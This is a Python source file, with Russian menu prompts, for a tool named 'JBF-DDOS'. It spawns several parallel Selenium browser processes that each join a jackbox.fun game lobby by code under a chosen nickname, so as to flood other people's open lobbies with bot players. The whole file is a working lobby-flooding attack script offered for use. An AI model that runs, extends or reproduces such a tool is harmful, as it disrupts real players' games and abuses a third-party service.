
import os, ujson, multiprocessing
from time import sleep

from modules.menu import ParentMenu
from modules.webdriver import DDOSdriver

from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def cls(): os.system('cls' if os.name=='nt' else 'clear')
    
class JBDdos():
    
    title = "ddos open lobby"
    
    def __init__(self):
        from modules.configs import DDosConfig
        
        self.config = DDosConfig()
    
    def ddos_by_code(self, code: str, count: int = 8):
        
        
        started_proccess:list[multiprocessing.Process] = []
        
        import art
        
        for _ in range(count): started_proccess.append(multiprocessing.Process(target=self.create_ddos_instance, args=[code]))
        
        for p in started_proccess: p.start()
            
        while [x for x in started_proccess if x.is_alive()] != []:
            
            cls()
            
            print(art.text2art("DDOSING..."))
            
            print(" ".join(["[ ]" if x.is_alive() else "[X]" for x in started_proccess ]))
            
            sleep(0.1)
        
        cls()
            
        
    
    def create_ddos_instance(self, code: str):
        
        driver = DDOSdriver()
        
        driver.get(f"https://jackbox.fun?code={code}")
        
        usernameinput = driver.find_element(By.XPATH, "/html/body/div/div/div[2]/div/form/fieldset/input[2]")
        usernameinput.send_keys(self.config.nickname)

        button_join = WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div/div/div[2]/div/form/fieldset/button")))
        button_join.click()
        
        sleep(2)
        
        return driver.close()
    
    def open_code_input_menu(self):
        
        import art
        
        code = None
        
        while True:
            cls()
            print(art.text2art("Code input"))
            code = input("\nВведите код игры: ").upper()
            
            if code == "0": break
            
            for code_letter in code:
                if code_letter not in ["Q", 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X', 'C', 'V', 'B', 'N', 'M']: code = ""

            if code: break
            
        if code == "0": self.open_menu()
        else: self.ddos_by_code(code)
    
    def open_menu(self, back_function=None): 
        
        if not os.path.exists(self.config.path): open(self.config.path, "w").write(ujson.dumps({"nickname": self.input_nickname()}))
        else: self.config.nickname = ujson.loads(open(self.config.path, "r").read())["nickname"]
        
        ParentMenu("JBF-DDOS", {"Заддудосить": self.open_code_input_menu, "Назад": back_function}).createMenu()
    
    def input_nickname(self):
        
        nickname = None
        
        while True:
            
            if nickname == None: pass
            elif nickname == "": return self.config.nickname
            elif not (len(nickname) < 11 and len(nickname) > 0): print(f"Длина никнейма должна быть от 1 до 11 символов...[{nickname}]")
            else: return nickname
            
            nickname = input(f"DDOS никнейм [Enter, чтобы установить по дефолту: {self.config.nickname}]: ")
        